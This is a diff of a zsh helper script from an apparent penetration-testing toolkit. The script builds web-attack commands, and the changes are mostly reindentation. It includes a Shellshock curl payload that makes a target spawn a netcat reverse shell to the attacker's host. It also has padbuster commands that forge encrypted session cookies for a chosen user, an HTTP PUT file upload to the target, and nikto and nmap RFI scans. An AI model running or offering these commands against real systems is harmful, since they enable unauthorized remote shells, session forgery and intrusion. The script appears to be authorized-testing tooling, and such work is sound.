@@ -5,7 +5,7 @@
 #############################################################
 
 qq-enum-web-vuln-help() {
-  cat << "DOC"
+    cat << "DOC"
 
 qq-enum-web-vuln
 ----------------
@@ -26,25 +26,24 @@ DOC
 }
 
 qq-enum-web-vuln-install() {
-
-  __pkgs nikto curl nmap padbuster
-  
+    __info "Running $0..."
+    __pkgs nikto curl nmap padbuster
 }
 
 qq-enum-web-vuln-nikto() {
-  __check-project
-  qq-vars-set-url
-  print -z "nikto -useragent \"${__UA}\" -h \"${__URL}\" -o $(__urlpath)/nikto.txt"
+    __check-project
+    qq-vars-set-url
+    print -z "nikto -useragent \"${__UA}\" -h \"${__URL}\" -o $(__urlpath)/nikto.txt"
 }
 
 qq-enum-web-vuln-nmap-rfi() {
-  qq-vars-set-rhost
-  print -z "nmap -vv -n -Pn -p80 --script http-rfi-spider --script-args http-rfi-spider.url='/' ${__RHOST}"
+    qq-vars-set-rhost
+    print -z "nmap -vv -n -Pn -p80 --script http-rfi-spider --script-args http-rfi-spider.url='/' ${__RHOST}"
 }
 
 qq-enum-web-vuln-shellshock-agent() {
-  qq-vars-set-lhost
-  qq-vars-set-lport
+    qq-vars-set-lhost
+    qq-vars-set-lport
     __ok "Copy the header value below to use in your exploit"
     cat << DOC
 
@@ -54,30 +53,30 @@ DOC
 }
 
 qq-enum-web-vuln-shellshock-nc() {
-  qq-vars-set-lhost
-  qq-vars-set-lport
-  qq-vars-set-rhost
-  __warn "Start a netcat listener for ${__LHOST}:${__LPORT}"
-  print -z "curl -A '() { :; }; /bin/bash -c \"/usr/bin/nc ${__LHOST} ${__LPORT} -e /bin/bash\"' \"http://${__RHOST}/cgi-bin/status\""
+    qq-vars-set-lhost
+    qq-vars-set-lport
+    qq-vars-set-rhost
+    __warn "Start a netcat listener for ${__LHOST}:${__LPORT}"
+    print -z "curl -A '() { :; }; /bin/bash -c \"/usr/bin/nc ${__LHOST} ${__LPORT} -e /bin/bash\"' \"http://${__RHOST}/cgi-bin/status\""
 }
 
 qq-enum-web-vuln-put-curl() {
-  qq-vars-set-rhost
-  local f && __askpath f FILE $(pwd)
-  print -z "curl -L -T ${f} \"http://${__RHOST}/${f}\" "
+    qq-vars-set-rhost
+    local f && __askpath f FILE $(pwd)
+    print -z "curl -L -T ${f} \"http://${__RHOST}/${f}\" "
 }
 
 qq-enum-web-vuln-padbuster-check() {
-  qq-vars-set-rhost
-  local cn && __askvar cn "COOKIE NAME"
-  local cv && __askvar cv "COOKIE VALUE"
-  print -z "padbuster ${__RHOST} ${cv} 8 -cookies ${cn}=${cv} -encoding 0"
+    qq-vars-set-rhost
+    local cn && __askvar cn "COOKIE NAME"
+    local cv && __askvar cv "COOKIE VALUE"
+    print -z "padbuster ${__RHOST} ${cv} 8 -cookies ${cn}=${cv} -encoding 0"
 }
 
 qq-enum-web-vuln-padbuster-forge() {
-  qq-vars-set-rhost
-  local cn && __askvar cn "COOKIE NAME"
-  local cv && __askvar cv "COOKIE VALUE"
-  __check-user
-  print -z "padbuster ${__RHOST} ${cv} 8 -cookies ${cn}=${cv} -encoding 0 -plaintext user=${__USER}"
+    qq-vars-set-rhost
+    local cn && __askvar cn "COOKIE NAME"
+    local cv && __askvar cv "COOKIE VALUE"
+    __check-user
+    print -z "padbuster ${__RHOST} ${cv} 8 -cookies ${cn}=${cv} -encoding 0 -plaintext user=${__USER}"
 }
